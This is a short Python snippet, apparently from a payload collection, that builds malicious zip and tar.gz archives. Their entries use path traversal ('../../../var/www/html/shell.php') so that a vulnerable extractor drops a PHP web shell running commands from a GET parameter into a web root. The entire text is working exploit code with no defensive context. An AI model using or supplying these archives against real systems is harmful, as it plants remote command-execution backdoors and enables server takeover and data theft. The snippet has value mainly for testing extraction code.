# ---- Create Malicious Zip (Python) ----

with zipfile.ZipFile("zipslip.zip", "w") as z:
    z.write("shell.php", arcname="../../../var/www/html/shell.php")

# ---- Create Malicious Tar (Python) ----
import tarfile, os

with tarfile.open("tarslip.tar.gz", "w:gz") as t:
    info = tarfile.TarInfo(name="../../../var/www/html/shell.php")
    info.size = len(b"<?php system($_GET['c']); ?>")
    import io
    t.addfile(info, io.BytesIO(b"<?php system($_GET['c']); ?>"))
